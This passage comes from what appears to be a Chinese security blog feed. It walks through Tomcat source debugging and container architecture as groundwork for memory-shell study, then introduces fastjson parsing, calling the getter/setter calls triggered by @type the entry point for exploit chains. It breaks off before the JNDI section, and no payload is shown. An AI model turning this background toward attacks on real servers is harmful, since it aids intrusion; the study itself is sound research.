class="hljs-name">version</span>&gt;</span>1.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.xml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jaxrpc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.eclipse.jdt.core.compiler<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ecj<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092054244.png" alt="image-20240909205433170"></p><p>然后配置一下合适的jdk版本，这个就不多说了</p><p>下一步配置configuration，添加一个application</p><p><img src="https://cdn.clown2024.cn/202409092056897.png" alt="image-20240909205609843"></p><p>添加入口类org.apache.catalina.startup.Bootstrap</p><blockquote><p>在此之前需要reload一下maven项目，不然会不识别相关的java源码</p></blockquote><p><img src="https://cdn.clown2024.cn/202409092057339.png" alt="image-20240909205701250"></p><p>然后我们就可以启动了</p><p><strong>错误一</strong></p><p>这时候会遇到第一个错误，无法解析jsp，也就是访问localhost:8080不是tomcat的首页而是返回了500，这时候需要去添加一个JSP解析器，需要我们去修改源码</p><p>找到org.apache.catalina.startup.ContextConfig类，在ConfigureStart方法下添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">context.addServletContainerInitializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JasperInitializer</span>(), <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092101636.png" alt="image-20240909210146552"></p><p><strong>错误二</strong></p><p>这时候页面访问是正常的，但是控制台的日志是乱码的，如下</p><p><img src="https://cdn.clown2024.cn/202409092047988.png" alt="image-20240909204702883"></p><p>这是因为在java中, 读取文件的默认格式是iso8859-1, 而我们中文存储的时候一般是UTF-8. 所以导致读出来的是乱码。</p><p>文章中有两种方式修改乱码，我这里采用修改源码的方式去修改，就是找到读取文件的地方，转化一下编码方式，这里直接copy一下解决方案，可以自己通过调试去找到对应位置(我比较懒就不调了)</p><ul><li><p>org.apache.tomcat.util.res.StringManager类中的getString(final String key, final Object… args)方法；添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        value =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(value.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092105213.png" alt="image-20240909210550131"></p></li><li><p>org.apache.jasper.compiler.Localizer类的getMessage(String errCode)方法；添加如下代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        errMsg =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(errMsg.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>        e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092107159.png" alt="image-20240909210715069"></p></li></ul><p>到这里就解决完我遇到的所有问题，可以快乐调试了🫡</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>我们首先要知道Tomcat是一个servlet容器。</p><h3 id="httpservletrequest和httpservletresponse"><a href="#HttpServletRequest和HttpServletResponse" class="headerlink" title="HttpServletRequest和HttpServletResponse"></a>HttpServletRequest和HttpServletResponse</h3><p><img src="https://cdn.clown2024.cn/202409112032626.png" alt="image-20240911203158516"></p><p><img src="https://cdn.clown2024.cn/202409112033582.png" alt="image-20240911203322536"></p><p>我们知道HttpServletRequest和HttpServletResponse是一个接口，我们正常写一个servlet如下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servlettest;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <br>        <span class="hljs-comment">// Hello</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;destory &quot;</span>+message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那我们调用这两个接口的方法就需要一个实现类，那这个实现类是谁创建呢，就由我们的tomcat来创建</p><p>去看tomcat的源码就可以知道RequestFacade就是其中一个实现类</p><p><img src="https://cdn.clown2024.cn/202409112036033.png" alt="image-20240911203618945"></p><p>不过这个类只是一个类似门面的类，里面真正的实现是Request类，里面的方法更复杂，该类也是实现了Servlet规范的类</p><p><img src="https://cdn.clown2024.cn/202409121050908.png" alt="image-20240912105042783"></p><p>这里就是给下面的分析当个引子，引发一下思考。</p><h3 id="jar包和war包"><a href="#jar包和war包" class="headerlink" title="jar包和war包"></a>jar包和war包</h3><p>我们在tomcat部署项目的时候，可以将web项目打包成war包然后部署到tomcat的webapps目录下</p><p><img src="https://cdn.clown2024.cn/202409121053527.png" alt="image-20240912105338467"></p><p>启动tomcat的时候他就会自动解压，里面的内容如下：</p><p><img src="https://cdn.clown2024.cn/202409121054829.png" alt="image-20240912105432764"></p><p>我们也可以在server.xml里面设置是否进行自动解压</p><p><img src="https://cdn.clown2024.cn/202409121055233.png" alt="image-20240912105551171"></p><p>那么jar包呢？</p><p>其实jar的内容和war包解压出来是没有什么区别的，jar和war包主要是tomcat启动时用来区分这是一个依赖还是一个应用</p><h3 id="tomcat应用的几种部署方式"><a href="#tomcat应用的几种部署方式" class="headerlink" title="tomcat应用的几种部署方式"></a>tomcat应用的几种部署方式</h3><p>部署的几种方式可以在<strong>HostConfig#deployApps</strong>中看到</p><p><img src="https://cdn.clown2024.cn/202409121100464.png" alt="image-20240912110054380"></p><ol><li>描述符部署</li><li>war包部署</li><li>文件夹部署，就是将war解压的文件夹直接放到webapps下面，和war包部署没什么区别</li></ol><blockquote><p>源码中可以看到tomcat部署应用的时候是进行多线程部署的</p></blockquote><p><strong>描述符部署</strong></p><p>描述符部署用的是&lt;Context&gt;标签，比如我要布置上面的应用可以在server.xml这样配置</p><p><img src="https://cdn.clown2024.cn/202409121117862.png" alt="image-20240912111717790"></p><p>docBase就是应用的目录，到时候tomcat就会从该目录查找所需要的资源比如我们的class文件</p><h3 id="context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><p>Context的本质上就是一个容器，源码中就有一个叫做Context的接口</p><p><img src="https://cdn.clown2024.cn/202409121149984.png" alt="image-20240912114943927"></p><p>他继承自一个Container接口，我们可以去看看Container有哪些继承接口，里面就包含着tomcat的四大容器</p><h2 id="tomcat容器"><a href="#Tomcat容器" class="headerlink" title="Tomcat容器"></a>Tomcat容器</h2><p><img src="https://cdn.clown2024.cn/202409121151081.png" alt="image-20240912115147007"></p><p>tomcat的四大容器：</p><ul><li><p>Context：就是一个web应用程序，也就是我们前面配置的程序，配置在Host节点下面</p></li><li><p>Host：表示一个虚拟主机，一个虚拟主机下面可以有很多的应用</p><p><img src="https://cdn.clown2024.cn/202409121154456.png" alt="image-20240912115408390"></p><p>name就是主机名，appBase就是应用目录，也就是我们为什么要放在webapps下面</p></li><li><p>Engine：字面意思引擎，Host是Engine的子节点</p><p><img src="https://cdn.clown2024.cn/202409121157589.png" alt="image-20240912115730532"></p><p>在Engine里面，我们是可以定义多个虚拟主机，所以也就是我们可以将不同的应用放在不同的主机下，通过不同的主机名访问具体应用，不至于将所有应用放在localhost下面。</p></li><li><p>Wrapper：它实际上就封装着一个Servlet，负责管理整个Servlet的生命周期，包括装载、初始化、资源回收等。</p></li></ul><blockquote><p><img src="https://cdn.clown2024.cn/202409121216408.png" alt="image-20240912121655347"></p><p>我们正常会继承一个HttpServlet，所有访问这个Servlet的请求是共用一个Servlet实例也就是单例模式，但如果实现SingleThreadModel接口的话就是每个请求单独拥有一个实例</p></blockquote><p>整个容器的层级结构就如下：<br>Engine&#x3D;&#x3D;》Host&#x3D;&#x3D;》Context&#x3D;&#x3D;》Wrapper&#x3D;&#x3D;》Servlet</p><p>再讲讲为什么要多一个Wrapper，因为我们有时候会有多个Servlet实例，全放在Context下面会不好管理，所以就用Wrapper将Servlet实例按照类型管理起来，所以存储结构类似如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>List&lt;Host&gt;<br>Host:<br>List&lt;Context&gt;<br>Context<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servlet类<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><h3 id="pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><p>这里也可以看一下这篇文章：<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>pipeline翻译过来就是管道，每一个容易都有一个管道组件，pipeline里面又有valve阀门</p><p>所以上面的结构又可以优化成这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Host&gt;<br>Host:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Context&gt;<br>Context<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servlet类<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><p>我们的Request对象想要最终servlet里面的doGet等方法，会经过前面一系列的容器、管道、阀门。</p><p>每个管道最重要的是最后一个阀门，因为他要负责将request往下一个容器进行传递，所以最后一个阀门是tomcat提前写好的。</p><p><strong>Valve节点</strong></p><p>该节点配置在Host节点下面，可以配置经过该阀门时需要做什么，我们只需要去实现或继承valve相关的接口或类即可自己配置</p><p><img src="https://cdn.clown2024.cn/202409121354703.png" alt="image-20240912135432620"></p><p>比如下面的记录日志</p><p><img src="https://cdn.clown2024.cn/202409121200163.png" alt="image-20240912120035093"></p><h3 id="standardwrapper"><a href="#StandardWrapper" class="headerlink" title="StandardWrapper"></a>StandardWrapper</h3><p>这里我们去看一下Wrapper的pipeline的最后一个valve，因为他是直接和servlet接触的；</p><p>Wrapper的实现类是StandardWrapper</p><p><img src="https://cdn.clown2024.cn/202409121358782.png" alt="image-20240912135850663"></p><p>这个valve就是我们说的最后一个valve</p><p><img src="https://cdn.clown2024.cn/202409121400857.png" alt="image-20240912140039778"></p><p>具体的逻辑在StandardWrapperValve的invoke方法里面，可以看到这里接受了Request和Response</p><p>我们来看一下他里面一些关键的步骤</p><p><img src="https://cdn.clown2024.cn/202409121956314.png" alt="image-20240912195619220"></p><p>这里是分配servlet实例的地方，方法里的具体逻辑就不分析，知道他的作用就好</p><p><img src="https://cdn.clown2024.cn/202409121957566.png" alt="image-20240912195722497"></p><p>然后这里生成了一个filterchain，将我们的request、wrapper、servelt都封装了进去，这里的filterchain就是我们前面提到Filter</p><p><img src="https://cdn.clown2024.cn/202409122000325.png" alt="image-20240912200056244"></p><p>然后最终的操作就是在我们的doFilter里面进行，我们自己要建立Filter也是像写servlet一样，写一个类继承Filter相关的接口，然后在web.xml中配置，和要过滤的servlet对应起来</p><p><img src="https://cdn.clown2024.cn/202409122007925.png" alt="image-20240912200740837"></p><p>后面的调用流程就自己调一下源码看看就好了</p><h2 id="tomcat-connector"><a href="#Tomcat-Connector" class="headerlink" title="Tomcat Connector"></a>Tomcat Connector</h2><p>我们在前面的Tomcat架构图可以看到有Connector组件，tomcat有两个核心功能：</p><p>1.处理 Socket 连接，负责网络字节流与 Request 和 Response 对象的转化。</p><p>2.加载和管理 Servlet，以及具体处理 Request 请求。</p><p>我们的Container组件负责内部Servlet的管理和处理过来的Request请求，那外部传过来的数据是怎么生成Request对象的呢，这靠的就是Connector组件利用Socket接受操作系统传过来的数据，然后生成Request和Response对象。</p><p>在Tomcat中有一个Connector类可以去看看他的setProtocol方法</p><p><img src="https://cdn.clown2024.cn/202409221831079.png" alt="image-20240922183030860"></p><p>他这里会根据选择不同的处理类，这个protocol就是我们server.xml那里配置的</p><p><img src="https://cdn.clown2024.cn/202409221835409.png" alt="image-20240922183544328"></p><p>然后HTTP1.1对应的两个处理类的区别如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">org.apache.coyote.http11.Http11AprProtocol ---BIO<br>org.apache.coyote.http11.Http11NioProtocol ---NIO<br></code></pre></td></tr></table></figure><p>那么这些类就是负责socket的连接管理和数据读取，我们可以进去看一下，这里看一下Http11NioProtocol的NIO读取数据</p><p><img src="https://cdn.clown2024.cn/202409222021606.png" alt="image-20240922202104507"></p><p>这里面new了一个NioEndpoint，这就是tomcat的一个连接器，用于处理网络连接，看一下他里面的方法</p><p><img src="https://cdn.clown2024.cn/202409222023442.png" alt="image-20240922202358352"></p><p>这里的Acceptor类是一个用于多线程执行任务的，因为AbstractEndpoint.Acceptor实现了Runnable接口，然后下面可以看到它accept了socket连接</p><p>那接受了socket之后就需要去处理这个socket连接，我们接着看</p><p><img src="https://cdn.clown2024.cn/202409222031639.png" alt="image-20240922203110543"></p><p>这里就会调用一个setSocketOptions来处理socket，如果返回false则关闭socket，我看视频里的版本他的是porcessSocket方法(可能是bio的方法)，我看了我的bio方法它使用的是<strong>processSocketWithOptions</strong>方法</p><p><img src="https://cdn.clown2024.cn/202409222045016.png" alt="image-20240922204517909"></p><p>nio还没学习看不太明白，但是最终就是在这里处理了，BIO就是使用线程池的方式来读取socket数据</p><p><img src="https://cdn.clown2024.cn/202409222049587.png" alt="image-20240922204936475"></p><p>这是bio的读取方式，然后继续往下跟就是一些数据解析然后构造Request对象，就不分析，有个大概概念就行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学内存马前就要来学一学java web三大件的相关原理：Servlet、Filter、Listener&lt;/p&gt;
&lt;p&gt;参考文章：&lt;a href=&quot;https://www.cnblogs.com/jadite/p/16951328.html&quot;&gt;https://www.cnbl</summary>
      
    
    
    
    <category term="java基础" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化</title>
    <link href="https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-23T17:35:44.000Z</published>
    <updated>2024-10-11T05:02:20.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson介绍"><a href="#fastjson介绍" class="headerlink" title="fastjson介绍"></a>fastjson介绍</h1><p>官方github地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p><p><strong>简单例子</strong></p><p>用Json的toJSONString方法将pojo类转换成字符串</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281554948.png" alt="image-20240828155427856"></p><p>这里的<strong>SerializerFeature.WriteClassName</strong>顾名思义就是指定序列化出来的字符串的格式，这里就是写出类名和键值对形式，更多的可以看源码尝试</p><p>JSON.parseObject将字符串转换回pojo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>        <span class="hljs-comment">//转变回pojo</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>        System.out.println(obj.getName() + <span class="hljs-string">&quot; &quot;</span> + obj.getAge());<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281555070.png" alt="image-20240828155545016"></p><p>这里注意要写全类名不然会报错</p><p>这里的<strong>Feature.SupportNonPublicField</strong>顾名思义也是还原的特点，这里是还原私有属性</p><p>然后我们注意到这里转换成pojo对象时会调用构造函数，其实还会调用他的set和get方法，所以fastjson的反序列化指的并不是java原生的反序列化，而是他json转化的过程。</p><p>将代码改一下看一下效果</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMap</span><span class="hljs-params">(String map)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setMap&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMap</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getMap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//这种方法会调用get和set方法</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;,\&quot;map\&quot;:\&quot;ceshi\&quot;&#125;&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">javaObject</span> <span class="hljs-operator">=</span> obj.toJavaObject(Student.class); <span class="hljs-comment">//只传一个参数只返回JSONObject类型，可以这样转换</span><br>        <span class="hljs-comment">//System.out.println(javaObject.getName() + &quot; &quot; + javaObject.getAge()+ &quot; &quot; + javaObject.getMap());</span><br>        System.out.println(<span class="hljs-string">&quot;------------------&quot;</span>);<br>        <span class="hljs-comment">//这种方法只调用set方法</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408282208338.png" alt="image-20240828220804265"></p><p>可以看到转换的时候会再一次调用set方法，而且注意这里的map属性我是没有定义的，但要是我的json字符串里有map属性也会调用对应的方法，不过对应的java对象get回来的属性值就为null</p><p>这里copy一下y4✌的总结：<a href="https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md">https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md</a></p><ul><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法会被调用两次；</li><li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li></ul><blockquote><p>还有源码的调用分析不写了太臭太长了，看组长的视频已经要晕了，后面看链子的时候穿插着分析吧</p></blockquote><p>这里还有一张调用类的关系图</p><p><img src="https://cdn.clown2024.cn/202408282214028.png" alt="1"></p><blockquote><p>JSON：门面类，提供入口</p><p>DefaultJSONParser：主类</p><p>ParserConfig：配置相关类</p><p>JSONLexerBase：字符分析类</p><p>JavaBeanDeserializer：JavaBean反序列化类</p></blockquote><p>fastjson的利用的入口点就是对应的set或get方法的链子</p><h1 id="fastjson122-124-jndi"><a href="#Fastjson1-22-1-24-JNDI" class="headerlink" title="Fastjson1.22-1.24 